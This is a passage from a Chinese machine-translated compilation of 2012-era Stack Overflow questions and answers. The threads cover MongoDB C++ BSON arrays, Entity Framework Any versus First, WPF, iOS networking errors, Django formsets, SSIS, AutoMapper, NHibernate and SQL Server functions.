该容器包含标题和可滚动列表，并包含`height: 100%`在页面正文中。它还具有`position: relative`使其子元素可以绝对定位的功能。

子元素 - 标题和列表 - 都具有`position: absolute`. 这样您就可以强制列表的高度既受限制（因此其内容溢出）又可变（根据其父级的高度），即它应该始终与其父级的高度完全相同，减去标题。请注意，其`top`属性的值需要对应于标题的*总*高度——包括填充和边框。

然后要获取您的滚动列表，您可以`overflow: auto`在列表中使用。

要在标题中获得居中文本就像 一样简单`text-align: center`，无论容器的宽度如何，它都可以使用。

# c++ - 使用c ++将数组数组插入mongo

> ID：12429183
> 
> 赞同：2
> 
> 时间：2012-09-14T17:20:39.213
> 
> 标签：c++, mongodb

以下代码有效，它的作用是：它从缓冲区读取并附加到 Mongo 中的“s”字段，但每次我通过循环时都会调用数据库：

```
bsonData = BSON("$push"<<BSON("s" << BSON("r" << (unsigned int)RecordNumber << "t" << Variant << "u" << TimeStamp << "v" << Value))); 
```

我想做的是用 4 个值填充一个向量，然后在一次调用中将该向量插入到数据库中，我试过这个：

```
for(i=0;i<vRecNo.size();i++)
{
    bOB.append("s", BSON("r" << (unsigned int)vRecNo[i] << 
                            "t" << (unsigned int)vType[i] << 
                            "u" << (unsigned int)vTimeStamp[i] << 
                            "v" << (unsigned int)vValue[i]));
} 
```

但在 Mongo 中创建了重复的“s”字段。非常感谢您的帮助，在此先感谢您。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T18:41:15.173

我不完全清楚你在问什么，但从标题来看，我会尽力提供帮助。

使用 C++ 在 mongo 中创建 BSON 数组有两种方法：

1.  像 BSON 宏一样使用 BSON_ARRAY 宏，但没有键。例如。

    BSONArray arr = BSON_ARRAY( "hello" << 1 << 2 << BSON( "foo" << BSON_ARRAY( "bar" << "baz" << "qux" ) ) );

    上面的示例将创建一个具有四个值的数组，其中最后一个元素是具有 3 个数组值的 BSON 文档

    [“你好”, 1, 2, { foo : [“bar”, “baz”, “qux”] } ]

2.  使用 BSONArrayBuilder 构建没有宏的数组。例如。

    BSONArrayBuilder b; BSONArray arr = b.append(1).append(2).arr();

    这将创建一个包含 2 个值的数组 [ 1, 2 ]

因此，在您的事业中，如果您想创建一个具有 4 个值的向量，您应该使用上述方法之一创建一个数组，将该数组分配给“s”，然后插入结果文档。这会给你这种形式的东西 { s : [ value1, value2, value3, value4 ] }

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T17:25:14.893

谢谢你的提示，我终于想通了，我发布了一段对我有用的代码：

```
 BSONObjBuilder bOb;
   BSONArrayBuilder bArr;
   for(i=0;i<vRecNo.size();i++)
    {
      BSONObj bo = BSON("r" << (unsigned int)vRecNo[i] << "t" << vType[i] << "u" << (unsigned int)vTimeStamp[i] << "v" << vValue[i]);
      bArr.append(bo);
    }
  bOb.append("s", bArr.arr());
  BSONObj bsonData = BSON("$set" << bOb.obj());

  conn.update("DatabaseName.Collection", qryData, bsonData); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-19T12:16:41.923

您可以将向量转换为 std::list 并附加列表：

```
std::list<std::string> aList(aVec.begin(),avec.end())
BSONArrayBuilder arrBuilder;
arrBuilder.append(aList); 
```

奇怪的是，您可以附加 std::list 但不能附加 std::vec。

# entity-framework - Linq To Entities - Any VS First VS Exists

> ID：12429185
> 
> 赞同：19
> 
> 时间：2012-09-14T17:20:43.347
> 
> 标签：entity-framework, ef-code-first, exists, any

我正在使用实体框架，我需要检查名称 = "xyz" 的产品是否存在......

我想我可以使用 Any()、Exists() 或 First()。

对于这种情况，哪一个是最佳选择？哪一个的性能最好？

谢谢你，

米格尔

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-09-15T18:20:37.770

好的，我不打算对此进行权衡，但是 Diego 的回答使事情变得足够复杂，以至于我认为需要进行一些额外的解释。

**在大多数情况下，`.Any()`会更快。**这里有些例子。

```
Workflows.Where(w => w.Activities.Any())
Workflows.Where(w => w.Activities.Any(a => a.Title == "xyz")) 
```

在上面的两个示例中，Entity Framework 生成了一个最优查询。该`.Any()`调用是谓词的一部分，Entity Framework 可以很好地处理这个问题。但是，如果我们将`.Any()`部分结果集的结果如下：

```
Workflows.Select(w => w.Activities.Any(a => a.Title == "xyz")) 
```

...突然，Entity Framework 决定创建两个版本的条件，因此查询的工作量是它真正需要的工作量的两倍。但是，以下查询也好不到哪里去：

```
Workflows.Select(w => w.Activities.Count(a => a.Title == "xyz") > 0) 
```

鉴于上述查询，Entity Framework 仍将创建两个版本的条件，此外，它还需要 SQL Server 进行实际计数，这意味着它不会在找到项目后立即短路。

但是，如果您只是比较这两个查询：

1.  `Activities.Any(a => a.Title == "xyz")`
2.  `Activities.Count(a => a.Title == "xyz") > 0`

...哪个会更快？这取决于。

第一个查询产生了一个低效的双条件查询，这意味着它将花费两倍的时间。

第二个查询强制数据库在不短路的情况下检查表中的每个项目，这意味着它可能需要`N`比它必须的时间更长的时间，具体取决于在找到匹配项之前需要评估多少项目。假设该表有 10,000 个项目：

*   如果表中没有任何项与条件匹配，则此查询将花费*大约一半的时间*作为第一个查询。
*   如果表中的第一项与条件匹配，则此查询将比第一个查询花费*大约 5,000 倍的时间。*
*   如果表中的一个项目匹配，则此查询将*平均*比第一个查询长 2,500 倍。
*   如果查询能够利用`Title`和键列上的索引，则此查询将花费*大约一半的时间*作为第一个查询。

总而言之，如果您是：

1.  使用~~实体框架 4（因为较新的版本可能会改进查询结构）~~实体框架 6.1 或更早版本（因为[6.1.1 有改进查询的修复程序](https://entityframework.codeplex.com/workitem/192)），并且
2.  直接查询表（而不是执行子查询），并且
3.  直接使用结果（而不是作为谓词的一部分），并且
4.  任何一个：
    1.  您在要查询的表上设置了良好的索引，或者
    2.  您希望大部分时间都找不到该项目

那么你可以期望`.Any()`花费两倍的时间`.Count()`。例如，一个查询可能需要 100 毫秒而不是 50 毫秒。或者 10 毫秒而不是 5。

*在任何其他* 情况下，`.Any()`都应该*至少**比*`.Count()`.

**无论如何**，在你确定这实际上是你的产品性能不佳的根源之前，你应该更关心什么是容易理解的。`.Any()`更清楚、更简洁地说明你真正想要弄清楚的东西，所以坚持下去。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-09-14T19:51:30.820

Any 在数据库级别转换为“存在”。First 转换为 Select Top 1 ... 在这些之间， Exists 将执行 First ，因为不需要获取实际对象，只需要一个布尔结果值。

至少您没有询问 .Where(x => x.Count() > 0) ，这需要评估和迭代整个匹配集，然后才能确定您有一个记录。任何使请求短路并且可以显着加快。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-15T00:26:39.163

有人会认为`Any()`会给出更好的结果，因为它可以转换为`EXISTS`查询……但是 EF 严重损坏，生成了这个（已编辑）：

```
SELECT 
CASE WHEN ( EXISTS (SELECT 
    1 AS [C1]
    FROM [MyTable] AS [Extent1]
    WHERE Condition
)) THEN cast(1 as bit) WHEN ( NOT EXISTS (SELECT 
    1 AS [C1]
    FROM [MyTable] AS [Extent2]
    WHERE Condition
)) THEN cast(0 as bit) END AS [C1]
FROM  ( SELECT 1 AS X ) AS [SingleRowTable1] 
```

代替：

```
SELECT 
CASE WHEN ( EXISTS (SELECT 
    1 AS [C1]
    FROM [MyTable] AS [Extent1]
    WHERE Condition
)) THEN cast(1 as bit)
   ELSE cast(0 as bit) END AS [C1]
FROM  ( SELECT 1 AS X ) AS [SingleRowTable1] 
```

...基本上将查询成本加倍（对于简单的查询；对于复杂的查询更糟）

我发现使用几乎总是更快（成本与正确编写的查询`.Count(condition) > 0`完全相同）`EXISTS`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-05-19T02:15:15.423

好的，我决定自己尝试一下。请注意，我将 OracleManagedDataAccess 提供程序与 OracleEntityFramework 一起使用，但我猜它会生成兼容的 SQL。

对于一个简单的谓词，我发现 First() 比 Any() 快。我将展示 EF 中的两个查询和生成的 SQL。请注意，这是一个简化的示例，但问题是询问简单谓词是否存在或首先更快。

```
 var any = db.Employees.Any(x => x.LAST_NAME.Equals("Davenski")); 
```

那么这在数据库中解决了什么问题？

```
SELECT 
CASE WHEN ( EXISTS (SELECT 
1 AS "C1"
FROM "MYSCHEMA"."EMPLOYEES" "Extent1"
WHERE ('Davenski' = "Extent1"."LAST_NAME")
 )) THEN 1 ELSE 0 END AS "C1"
FROM  ( SELECT 1 FROM DUAL ) "SingleRowTable1" 
```

它正在创建一个 CASE 语句。我们知道，ANY 只是合成糖。它解析为数据库级别的 EXISTS 查询。如果您在数据库级别也使用 ANY，就会发生这种情况。但这似乎不是这个查询最优化的 SQL。在上面的示例中，此处不需要 EF 构造 Any()，它只会使查询复杂化。

```
 var first = db.Employees.Where(x => x.LAST_NAME.Equals("Davenski")).Select(x=>x.ID).First(); 
```

这在数据库中解析为：

```
SELECT 
"Extent1"."ID" AS "ID"
FROM "MYSCHEMA"."EMPLOYEES" "Extent1"
WHERE ('Davenski' = "Extent1"."LAST_NAME") AND (ROWNUM <= (1) ) 
```

现在，这看起来像是比初始查询更优化的查询。为什么？它没有使用 CASE ... THEN 语句。

我多次运行这些微不足道的示例，几乎在每种情况下（没有双关语），First() 都更快。

此外，我运行了一个原始 SQL 查询，认为这样会更快：

```
var sql = db.Database.SqlQuery<int>("SELECT ID FROM MYSCHEMA.EMPLOYEES WHERE LAST_NAME = 'Davenski' AND ROWNUM <= (1)").First(); 
```

性能实际上是最慢的，但类似于 Any EF 构造。

思考：

1.  EF Any 并不完全映射到您在数据库中使用 Any 的方式。与没有 CASE THEN 语句的 EF 生成的查询相比，我可以使用 ANY 在 Oracle 中编写更优化的查询。
2.  始终在日志文件或调试输出窗口中检查您生成的 SQL。
3.  如果您要使用 ANY，请记住它是 EXISTS 的语法糖。Oracle 也使用 SOME，这与 ANY 相同。您通常会在谓词中使用它来代替 IN。在这种情况下，它会在您的 WHERE 子句中生成一系列 OR。ANY 或 EXISTS 的真正威力在于您使用子查询并且只是测试相关数据的存在性。

这是一个 ANY 真正有意义的例子。我正在测试相关数据的存在性。我不想从相关表中获取所有记录。在这里，我想知道是否有带有评论的调查。

```
var b = db.Survey.Where(x => x.Comments.Any()).ToList(); 
```

这是生成的 SQL：

```
SELECT 
"Extent1"."SURVEY_ID" AS "SURVEY_ID", 
"Extent1"."SURVEY_DATE" AS "SURVEY_DATE"
FROM "MYSCHEMA"."SURVEY" "Extent1"
WHERE ( EXISTS (SELECT 
1 AS "C1"
FROM "MYSCHEMA"."COMMENTS" "Extent2"
WHERE ("Extent1"."SURVEY_ID" = "Extent2"."SURVEY_ID")
 )) 
```

这是优化的 SQL！我相信 EF 在生成 SQL 方面做得很好。但是您必须了解 EF 构造如何映射到 DB 构造，否则您可能会创建一些讨厌的查询。

获得相关数据计数的最佳方法可能是使用集合查询计数进行显式加载。这比之前帖子中提供的示例要好得多。在这种情况下，您不会加载相关实体，而只是获取计数。在这里，我只是想找出我对特定调查有多少评论。

```
 var d = db.Survey.Find(1);

  var  e = db.Entry(d).Collection(f => f.Comments)
                               .Query()
                               .Count(); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-09-14T17:27:30.850

`Any()`并与它`First()`一起使用`IEnumerable`，使您可以灵活地懒惰地评估事物。但是`Exists()`需要列表。

我希望这可以为您清除问题并帮助您决定使用哪一个。

# c# - 带有 ListView 的 TabControl

> ID：12429187
> 
> 赞同：1
> 
> 时间：2012-09-14T17:20:47.653
> 
> 标签：c#, wpf, listview, tabcontrol

我有一个[`TabControl`](http://msdn.microsoft.com/en-us/library/system.windows.controls.tabcontrol.aspx)where 每个`TabItem`显示一个[`ListView`](http://msdn.microsoft.com/en-us/library/system.windows.controls.listview.aspx). 每个选项卡的列表都相同，但根据所选选项卡按不同的字段排序。

所以，**我不希望**每个都`TabItem`包含不同的`ListView`：

```
<TabControl>

    <TabItem>
        <ListView/>
    </TabItem>

    <TabItem>
        <ListView/>
    </TabItem>

</TabControl> 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:30:10.207

快捷方便。让代码保持现在的样子。然后在您的 ViewModel 上只有一个列表，您可以有 N 个不同的只读属性（其中 N 是选项卡的数量），它们将返回相同的列表，但按您想要的顺序排序。

事情是：

> 我不希望每个 TabItem 包含不同的 ListView

但这正是你正在做的。在每个 TabItem 中有一个排序不同的列表。

**例子**

看法：

```
<TabControl>
    <TabItem>
        <ListView ItemsSource="{Binding SortedByX}" />
    </TabItem>
    <TabItem>
        <ListView ItemsSource="{Binding SortedByY}" />
    </TabItem>
    <TabItem>
        <ListView ItemsSource="{Binding SortedByZ}" />
    </TabItem>
</TabControl> 
```

视图模型：

```
public List<The type of your list items> List { get; set; }

public List<The type of your list items> SortedByX 
{
    get
    {
        return List.Sort(iComparer);
    }
}

// Or using LINQ

public List<The type of your list items> SortedByY 
{
    get
    {
        return List.OrderBy....
    }
} 
```

# iphone - 获取错误域=NSURLErrorDomain 代码=-1004“无法连接到服务器。”

> ID：12429192
> 
> 赞同：10
> 
> 时间：2012-09-14T17:21:20.230
> 
> 标签：iphone, .net, ios, nsurlconnection

我使用 NSURLConnection 从我的 ios 应用程序调用 Web 服务。这是我的代码

```
#define kBaseServerUrl       @"http://winshark.softwaytechnologies.com/bariodwcfservice/baroidservice.svc/Json/"

#define kProductServiceUrl @"Products"

-(void)callService{
    NSURL *url;
    if (currState == ProductServiceState) {
        url = [NSURL URLWithString:[NSString  stringWithFormat:@"%@%@/%d",kBaseServerUrl,kProductServiceUrl,[self getRevisionNumberForProduct]]];
    }
    else if(currState == TankStrickerServiceState){
        url = [NSURL URLWithString:[NSString  stringWithFormat:@"%@%@/%d",kBaseServerUrl,kTankStrickerServiceUrl,[self getRevisionNumberForTankStricker]]];
    }else if(currState == CalculationServiceState){
        url = [NSURL URLWithString:[NSString  stringWithFormat:@"%@%@/%d",kBaseServerUrl,kCalculationServiceUrl,[self getRevisionNumberForCalculation]]];
    }else{
        //Future Use
    }
    NSLog(@"%@",[url absoluteString]);
    NSURLRequest *urlRequest = [NSURLRequest requestWithURL:url];
    NSURLConnection *urlConnection = [[NSURLConnection alloc] initWithRequest:urlRequest delegate:self];

    NSLog(@"%@",urlConnection);
} 
```

它最终调用了这个网址[http://winshark.softwaytechnologies.com/bariodwcfservice/baroidservice.svc/Json/Products/123](http://winshark.softwaytechnologies.com/bariodwcfservice/baroidservice.svc/Json/Products/123)

但是当我在浏览器中点击这个网址时它工作正常，但在我的应用程序中我收到了这个错误

```
Error Domain=NSURLErrorDomain Code=-1004 "Could not connect to the server." 
```

请帮助我可能是什么问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-25T23:12:49.160

看起来您设置正确，我怀疑您的对象有一些问题 - 尝试通过将现有 URL 请求替换为以下内容来调用硬编码 URL：

```
NSURLRequest *urlRequest = [NSURLRequest 
requestWithURL:[NSURL URLWithString:@"http://www.google.com"]]; 
```

应该使故障排除变得容易得多。

# django - Django Formset - 访问主键 id 输入

> ID：12429196
> 
> 赞同：1
> 
> 时间：2012-09-14T17:21:32.667
> 
> 标签：django, forms, primary-key, modelform, formset

我想`<input type="hidden" name="form-0-id" value="5" id="id_form-0-id">`直接在我的模板中呈现主键 ID 隐藏输入 ()。我知道我可以渲染整个表单，但我不想在那里有任何标签。有没有办法使用表单集来获取它？我使用了 object `initial.id`，但它没有用。

**方法：**

```
def getCellEditForm(self):      
    CellFormSet = modelformset_factory(Cell, extra=0, max_num=0)
    form = CellFormSet(queryset=Cell.objects.filter(pk=self.id))
    return form 
```

**模板：**

```
{{ child.getCellEditForm.form.title }}
{{ child.getCellEditForm.form.parent }}   
{{ child.getCellEditForm.form.initial.id }} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:36:21.427

```
{% for subform in formset.forms %}
    {{ subform.id }}
{% endfor %} 
```

或者

```
{% for subform in formset.forms %}
    <input type='hidden' id='id_form{{subform.id}}' name='form{{subform.id}}' value='{{subform.id}}' />
{% endfor %} 
```

# sql-server-2008 - 连接管理器中的动态 ConnectionString (OLE DB)

> ID：12429203
> 
> 赞同：0
> 
> 时间：2012-09-14T17:22:02.850
> 
> 标签：sql-server-2008, ssis

我有一个本地数据库表，其中包含 50 多个外部数据源，我可以从中构建连接字符串。我目前正在尝试设置 SSIS 以从该表动态构建连接字符串并将它们传递给连接管理器。我已经成功设置了一个变量并将这个变量分配给连接管理器中的 ConnectionString 表达式属性。

然后，我使用 OLE DB 源对象将表从该源复制到我们的本地数据库。问题是，如果在设计时未设置连接字符串，我会收到 OLE DB 对象的验证错误。

![我的](../Images/efd41775a576e5a6231b2a1e6d850856.png)

如果我手动设置连接字符串属性，它可以正常工作，但这违背了创建动态连接字符串变量的目的。

这里的想法是让动态分区检测它正在运行的机器并构建正确的字符串（DEV、UAT、QA）。我也不希望在 dtsConfig 文件中使用这些连接字符串。

我看了一下：[http](http://www.simple-talk.com/sql/ssis/working-with-property-expressions-in-sql-server-integration-services/) ://www.simple-talk.com/sql/ssis/working-with-property-expressions-in-sql-server-integration-services/ ，但它没有任何解决方案我的情况。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:26:37.030

在阅读了该错误“包验证错误”的第一行后，我刚刚找到了解决方案，我转到包属性并将延迟验证更改为真。

我想在这里提出问题确实可以帮助您找到自己的解决方案。

# c# - 将多个对象自动映射到一个对象

> ID：12429210
> 
> 赞同：8
> 
> 时间：2012-09-14T17:22:31.977
> 
> 标签：c#, automapper

我有两个子类，我需要将 List 元素复制到主对象中

```
public Class Foo1 : Anote
{
  public bool Ison { get; set;}
  public List<Anote>Anotes { get; private set;}

  public Foo1()
  {
    this.Anotes = new List<Anote>();
  }
}

public Class Foo2 : Bnote
{
  public bool Ison { get; set;}
  public List<Bnote>Anotes { get; private set;}

  public Foo2()
  {
    this.Anotes = new List<Bnote>();
  }
}

public Class Foo3 : Cnote
{
   public bool Ison { get; set;}
   public List<Cnote>Anotes { get; private set;}
   public List<Cnote>Bnotes { get; private set; }

} 
```

我将从数据库中检索数据并将这些数据放入 Foo1 和 Foo2。然后我需要将 Foo1 和 Foo2 中的 List 数据映射到 Foo3 中的 List 元素中。

我已经做好了

```
Foo1A foo1a = new Foo1A();
Foo2A foo2a = new Foo2A();

Mapper.CreateMap<Foo1, Foo1A>();
Mapper.CreateMap<Foo2, Foo2A>();
Mapper.Map<Foo1, Foo2A>(foo1, foo1a);
Mapper.Map<Foo2, Foo2A>(foo2, foo2a); 
```

这行得通，但我需要做的是

将 Foo1 中的 List Anotes 映射到 Foo3 中的 List Anotes 将 Foo2 中的 List Anotes 映射到 Foo3 中的 List Bnotes。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-15T00:27:10.443

你应该能够做到：

```
Mapper.CreateMap<ANote, CNote>();

Mapper.CreateMap<Foo1, Foo3>()
    .ForMember(dest => dest.ANotes, opt => opt.MapFrom(src => src.ANotes))
    .ForMember(dest => dest.BNotes, opt => opt.Ignore());

Mapper.CreateMap<Foo2, Foo3>()
    .ForMember(dest => dest.BNotes, opt => opt.MapFrom(src => src.ANotes))
    .ForMember(dest => dest.ANotes, opt => opt.Ignore());

Foo3 foo3 = new Foo3();

Mapper.Map<Foo1, Foo3>(foo, foo3);
Mapper.Map<Foo2, Foo3>(foo2, foo3); 
```

`foo3.ANotes`并且`foo3.BNotes`应该都已正确映射。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-30T18:30:09.460

对于我的情况，接受的答案感觉不是一个可以接受的解决方案。昨晚睡着了，心里想：

假设你想映射你的两个类，`Foo1`并`Foo2``Foo3`

```
public Class Foo1 : Anote
{
  public bool Ison { get; set;}
  public List<Anote>Anotes { get; private set;}

  public Foo1()
  {
    this.Anotes = new List<Anote>();
  }
} 
```

+

```
public Class Foo2 : Bnote
{
  public bool Ison { get; set;}
  public List<Bnote>Anotes { get; private set;}

  public Foo2()
  {
    this.Anotes = new List<Bnote>();
  }
} 
```

=

```
public Class Foo3 : Cnote
{
   public bool Ison { get; set;}
   public List<Cnote>Anotes { get; private set;}
   public List<Cnote>Bnotes { get; private set; }

} 
```

您真正需要的是另一个用于 Automapper 目的的包装类。

```
public class Foo1And2 {
    public Foo1 Foo1 {get;set;}
    public Foo2 Foo2 {get;set;}
} 
```

然后定义映射：

```
CreateMap<Foo1And2, Foo3>().ConvertUsing(x => ConvertFoo1And2ToFoo3(x)); 
```

```
public Foo3 ConvertFoo1And2ToFoo3(Foo1And2 foo1And2)
{
    return new Foo3
    {
        Ison = foo1And2.Foo1.Ison && foo1And2.Foo2.Ison,
        Anotes = foo1And2.Foo1.Anotes,
        Bnotes = foo1And2.Foo2.Bnotes,
    };
} 
```

并使用它

```
var foo3 = Map<Foo3>(new Foo1And2
{
    Foo1 = foo1,
    Foo2 = foo2,
}); 
```

# c# - 如何在 MVC3 C# 中调用存储过程

> ID：12429212
> 
> 赞同：1
> 
> 时间：2012-09-14T17:22:49.383
> 
> 标签：c#, sql, asp.net-mvc-3, entity-framework

我正在寻找一种在控制器的 C# 代码中调用我的存储过程的方法。我已经在控制器中拥有了我需要的一切。我在编辑的帖子上有ID，提交时我需要做的是调用带有参数id的存储过程。在 SQL 中，您可以这样做：

```
 EXEC [dbo].[AddGlassCutting] @AuditScheduleID = 1192 
```

去测试。这在我的网站代码中不起作用。数据库是通过代码优先的方法完成的。

2012 年 9 月 14 日 1:33 更新

从编辑帖子添加代码 - 这也是我需要它执行的地方：

```
 [HttpPost]
    public ActionResult Edit(int id, AuditScheduleEdit viewModel)
    {            
        if (ModelState.IsValid)
        {
            viewModel.PopulateCheckBoxsToSpacerType();
            _db.Entry(viewModel.AuditScheduleInstance).State = System.Data.EntityState.Modified;
            _db.SaveChanges();
            return RedirectToAction("Audit", new {id});
        }
        else
        {
            return View(viewModel);
        }

    } 
```

2012 年 9 月 18 日更新

```
 [HttpPost]
    public ActionResult Edit(int id, AuditScheduleEdit viewModel)
    {            
        if (ModelState.IsValid)
        {
            var addGlassCutting = new SqlParameter("@AuditScheduleID", id);
            _db.Database.SqlQuery<QQAForm.ViewModels.AuditScheduleEdit.AddGlassCutting>
                ("AddGlassCutting @AuditScheduleID", addGlassCutting);
            viewModel.PopulateCheckBoxsToSpacerType();
            _db.Entry(viewModel.AuditScheduleInstance).State = System.Data.EntityState.Modified;
            _db.SaveChanges();
            return RedirectToAction("Audit", new {id});
        }
        else
        {
            return View(viewModel);
        }

    } 
```

这是我的存储过程：

```
ALTER PROCEDURE [dbo].[AddGlassCutting] 
-- Add the parameters for the stored procedure here
@AuditScheduleID int = null
AS
BEGIN
-- SET NOCOUNT ON added to prevent extra result sets from
-- interfering with SELECT statements.
SET NOCOUNT ON;

-- Insert statements for procedure here
/****** Script for adding Glass Cutting  ******/
INSERT INTO QQAEntities.dbo.MainAnswers (AuditScheduleID, MainQuestionID)
SELECT @AuditScheduleID, MainQuestionID
FROM QQAEntities.dbo.MainQuestions
WHERE ReferenceNo > 0 
```

结尾

此时代码中没有错误，它可以编译，但是在执行时它不会运行存储过程。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-20T20:09:55.200

以下是我发现和工作的内容。这适用于 MVC3 C# 代码优先方法。

```
 [HttpPost]
    public ActionResult Edit(int id, AuditScheduleEdit viewModel)
    {            
        if (ModelState.IsValid)
        {
            var addGlassCutting = new SqlParameter("@AuditScheduleID", id);
            _db.Database.SqlCommand
            ("EXEC AddGlassCutting @AuditScheduleID", addGlassCutting);
            viewModel.PopulateCheckBoxsToSpacerType();
            _db.Entry(viewModel.AuditScheduleInstance).State = System.Data.EntityState.Modified;
            _db.SaveChanges();
            return RedirectToAction("Audit", new {id});
        }
        else
        {
            return View(viewModel);
        }

    } 
```

最后的收获是使用 SqlCommand 而不是 SqlQuery。如果需要，您可以在顶部添加其他参数。我只需要那个。存储过程是用 SQL Server 2008 Express 编写的，我在网页中唯一要做的就是执行它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T20:04:39.813

您应该尝试使用 Entity Framework，但如果您遇到困难，那么至少创建一些 SOC（关注点分离）并将您的数据库 ADO.NET 调用放在您的控制器之外。您希望拥有未连接到数据库的 SKINNY 控制器。

理想情况下，层...在您的解决方案中创建更多项目并拥有 YourProject.Data 等。尝试创建存储库模式...尝试使用 IOC 容器。

有些概念可能只是你还没有准备好的东西。现在你当然可以使用 web.config 连接字符串并连接你的控制器来查询 /pull 数据，但请不要让数据库代码渗入你的控制器方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:25:43.877

所以你先说代码，我假设你使用的是实体框架：

[Entity Framework Code First 是否支持存储过程？](https://stackoverflow.com/questions/4845246/does-entity-framework-code-first-support-stored-procedures)

# webgl - 多维数据集上的 tQuery 事件处理程序

> ID：12429214
> 
> 赞同：2
> 
> 时间：2012-09-14T17:23:01.607
> 
> 标签：webgl, tquery

我刚开始尝试使用 tQuery 的 webgl 并且嗯.. 最简单的代码是：

```
var world = tQuery.createWorld().boilerplate().start();
var object = tQuery.createCube().addTo(world); 
```

现在，如果单击了那个多维数据集，我想向节点发出一些数据，但是它并没有真正起作用，我尝试了不同的版本，例如：

```
$('canvas').click(function(e){
    socket.emit('foo', { msg: 'cube clicked'});
}); 
```

取决于

```
$(tQuery('cube')).on('click', function(e){
    socket.emit('foo', { msg: 'cube hovered'});
}); 
```

但它不仅会在我单击多维数据集时触发，而且如果我在多维数据集旁边单击也会触发 -> 如果我单击 tQuery 表面上的任何位置就会触发

如何解决？

打招呼

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T15:13:25.677

```
tQuery('cube').on('click', function(e){}); 
```

这应该这样做

# ruby-on-rails - Cucumber Feature - 数据填充处理数组

> ID：12429217
> 
> 赞同：1
> 
> 时间：2012-09-14T17:23:08.080
> 
> 标签：ruby-on-rails, activerecord, cucumber

我在 Rails 中有一个 ActiveRecord，它有一个序列化：file_names，Array 字段

在我的黄瓜 details.feature 中，我有以下内容：

```
Given the following dist_details exist
     | effective_date | company_id | file_names           | sent_at             |
     |     2012-03-01 |          1 | test1.pdf,test2.pdf  | 2012-04-01 13:00:00 |
     |     2012-04-01 |          2 | test3.pdf,test4.pdf  | 2012-04-01 14:00:00 | 
```

当我运行黄瓜测试时，出现以下错误：

```
Attribute was supposed to be a Array, but was a String
(ActiveRecord::SerializationTypeMismatch)
      ./features/step_definitions/pickle_steps.rb:15:in `/^the following (( 
```

如何自动填充文件名 test1.pdf、test2.pdf 的数组值？

# c# - 通过 Web 服务时从 NHibernate 接收陈旧数据

> ID：12429226
> 
> 赞同：0
> 
> 时间：2012-09-14T17:24:13.063
> 
> 标签：c#, nhibernate

我无法掌握 NHibernates 缓存/数据库命中预防技术的一些特性。

我创建了一个测试用例，它应该确保我们的 Web 服务 API 正确地创建和保存一个新对象。当我不必通过 Web 服务进行序列化（例如，直接使用 Web 服务类而不是将其添加为服务引用并向上/向下通过它）时，测试用例可以正常通过。但是，当我针对托管的 Web 服务运行测试用例时，我从 NHibernate 收到过时的数据。

```
[Test]
public void CreateInstallTask()
{
    int numberOfTasks = TaskDao.GetAll().Count();

    TaskDto taskDto = WorkflowServices.CreateInstallTask(OrderID, TaskTemplateID, SiteID, DataCenterID,
                                                            DeviceTemplateID, DeviceName, Username);

    if (TaskDao.GetAll().Count() == numberOfTasks)
    {
        string failureReason =
            string.Format("Failed to create new Install task with OrderID: {0}", taskDto.OrderID);

        throw new Exception(failureReason);
    }
}

[WebMethod(Description = "Creates a new install Task.")]
public TaskDto CreateInstallTask(int orderID, int taskTemplateID, int siteID, int dataCenterID,
    int deviceTemplateID, string deviceName, string username)
{
    try
    {
        Order order = OrderDao.GetByID(orderID, shouldLock: false);

        if (order == null)
            throw new Exception(string.Format("Failed to find an order with ID {0}", orderID));

        Task task = new Task
            {
                Order = order,
                TaskType = TaskType.Install,
                TaskTemplateID = taskTemplateID,
                CreateUserID = username,
                CreateDateTime = DateTime.Now
            };

        TaskAction taskAction = new TaskAction(TaskDao, TaskDeviceDao, ActivityDao, task, username);
        //Call TaskDto.Create to convert Task into TaskDto for client-side use.
        return TaskDto.Create(taskAction.CreateTask());
    }
    catch (Exception exception)
    {
        Logger.Error(exception);
        throw;
    }
} 
```

GetAll() 方法只是表中所有行的条件。List()。CreateTask 方法只调用 ISession.SaveOrUpdate();

我知道我有能力强制重新加载数据，但我不明白为什么我必须这样做。

当我调用 SaveOrUpdate(entity) 时，该实体应该自动添加到 NHibernate 的缓存中，对吗？为什么 TaskDao.GetAll() 会返回陈旧数据？

我担心过度使用 CommitTransaction()。我认为我不应该在每次 SaveOrUpdate() 之后调用 CommitTransaction() ——这违背了 NHibernates 缓存的目的。但是，我也不希望我的测试用例数据过时。如何保持缓存同步？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:59:05.860

您是正确的，您不应该在每次保存后提交事务，但您的 Web 服务应该在 Web 调用开始时创建新事务并在 Web 调用结束时提交。

Web 服务通常遵循与网站通常遵循的每个请求相同的会话模式，因此请确保您的 Web 服务基础架构正在创建新的 NHibernate ISession 并针对每个请求启动新事务。在该请求结束时，它应该提交所做的任何更改。

# sql-server - 正确使用表值函数

> ID：12429227
> 
> 赞同：0
> 
> 时间：2012-09-14T17:24:20.227
> 
> 标签：sql-server, user-defined-functions

我有一个`my_ids`单列表`id`。接下来，我有一个表值函数`fn_getMatches(id)`。我想要的是遍历表`my_ids`和每个`id`调用函数`fn_getMatches(id)`并将所有结果汇总到一个表中。如果没有显式循环，我该怎么做？

我试过了：

```
select *
from my_ids ids
     full outer join fn_getMatches(ids.id) on 1=2
where ids.id is null 
```

但它返回：

> 消息 4104，级别 16，状态 1，第 11 行
